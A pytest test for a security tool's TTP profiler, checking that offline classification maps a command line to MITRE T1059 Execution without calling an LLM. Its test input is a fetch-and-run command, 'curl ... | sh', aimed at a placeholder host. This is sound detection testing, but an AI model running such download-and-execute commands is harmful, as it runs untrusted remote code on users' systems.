import pytest

from app.agents import ttp_profiler


@pytest.mark.asyncio
async def test_offline_classification_never_initializes_an_llm(monkeypatch):
    def fail_if_called():
        raise AssertionError("deterministic classification attempted external enrichment")

    monkeypatch.setattr(ttp_profiler, "get_llm", fail_if_called)

    result = await ttp_profiler.classify_ttp(
        command_line="curl https://example.invalid/tool.sh | sh",
        raw_log="curl https://example.invalid/tool.sh | sh",
        use_llm=False,
    )

    assert result["technique_id"] == "T1059"
    assert result["tactic"] == "Execution"
